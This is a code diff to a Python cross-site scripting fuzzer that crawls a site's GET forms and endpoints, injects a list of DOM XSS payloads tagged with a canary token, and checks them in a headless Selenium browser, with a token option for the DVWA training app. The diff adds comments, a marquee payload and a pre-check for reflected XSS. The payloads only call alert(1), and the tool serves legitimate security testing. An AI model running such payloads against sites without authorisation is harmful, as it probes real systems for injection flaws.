@@ -37,9 +37,10 @@ dom_payloads = [
         "</script><script>alert(1)</script>",
         "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
         "<body onload=alert(1)>",
-        "javascript:alert(1)",
         "<img src=1 onerror=alert`1`>",
         "<img src=x onerror=confirm(1)>",
+        "<marquee onstart=alert(1)>",
+        "javascript:alert(1)"
     ]
 
 def canary(payload, token):
@@ -229,7 +230,7 @@ class XSSFuzzer:
 
     def formXSS(self, forms):
         """
-            Takes the forms retrieved by the crawler and fuzzes them
+            Takes the forms retrieved by the crawler and fuzzes them for reflected XSS
         """
         results = []
 
@@ -492,18 +493,22 @@ class XSSFuzzer:
         candidates = []
 
         if forms:
+            # Build URLs from forms
             for form in forms:
 
                 url = form.get("url")
                 method = (form.get("method") or "GET").upper()
                 fields = form.get("formFields") or[]
 
+                # Only fuzz get forms with fields
                 if not url or method != "GET" or not fields:
                     continue
 
+                # Normalize relative form URLs
                 if not url.startswith("http"):
                     url = f"{base}{url}"
 
+                # Try all DOM specific payloads
                 for raw in dom_payloads:
                     marked = canary(raw, self.token)
                     parts = []
@@ -516,6 +521,7 @@ class XSSFuzzer:
                     candidates.append((f"{url}#{quote(marked, safe='')}", raw, marked))
 
         if endpoints:
+            # Build URLs from endpoints
             for ep in endpoints:
                 rawUrl = ep.get("url")
                 params = ep.get("params") or []
@@ -523,9 +529,13 @@ class XSSFuzzer:
                 if not rawUrl or not params:
                     continue
 
+                # Normalize URLs
                 fullUrl = rawUrl if rawUrl.startswith("http") else f"{base}{rawUrl}"
+
+                # Randomly sample the dom_payloads to save time
                 chosenPayloads = dom_payloads if len(dom_payloads) <= 4 else random.sample(dom_payloads, 4)
 
+                # Try chosen DOM specific payloads
                 for raw in chosenPayloads:
                     marked = canary(raw,self.token)
                     parts = [f"{p}={quote(marked,safe='')}" for p in params]
@@ -533,9 +543,11 @@ class XSSFuzzer:
                     candidates.append((f"{fullUrl}{seperator}{'&'.join(parts)}", raw, marked))
                     candidates.append((f"{fullUrl}#{quote(marked, safe='')}", raw, marked))
 
+        # If no fuzzable URLs found then return empty
         if not candidates:
             return results
 
+        # Configure the selenium webdriver
         options = Options()
         if self.headless:
             options.headless = True
@@ -559,16 +571,38 @@ class XSSFuzzer:
 
             seen = set()
             for finUrl, raw, marked in candidates:
+                # Normalize the page key
                 pageKey = finUrl.split("?", 1)[0].split("#", 1)[0]
 
                 if pageKey in seen:
+                    # Skip already tested pages
+                    continue
+
+                urlCheck = finUrl
+
+                # Add DVWA token if required
+                if self.isDVWA and self.userToken:
+                    urlCheck = f"{finUrl}{'&' if '?' in finUrl else '?'}user_token={self.userToken}"
+
+                # pre check with raw http to skip reflected XSS
+                try:
+                    pre = self.session.get(urlCheck, headers=self.headers, timeout= 3,allow_redirects=False)
+                    pre_body = pre.text or ""
+                except Exception:
+                    pre_body = ""
+
+                reflected = self.token.lower() in pre_body.lower()
+
+                if reflected:
                     continue
 
                 try:
                     driver.get(finUrl)
+                    # Estimate to allow for JS
                     time.sleep(0.25)
                     body = driver.page_source or ""
 
+                    # Check if DOM XSS worked
                     if self.token.lower() in body.lower() and detectXSS(body, self.token, marked):
                         results.append({
                             "url": finUrl,
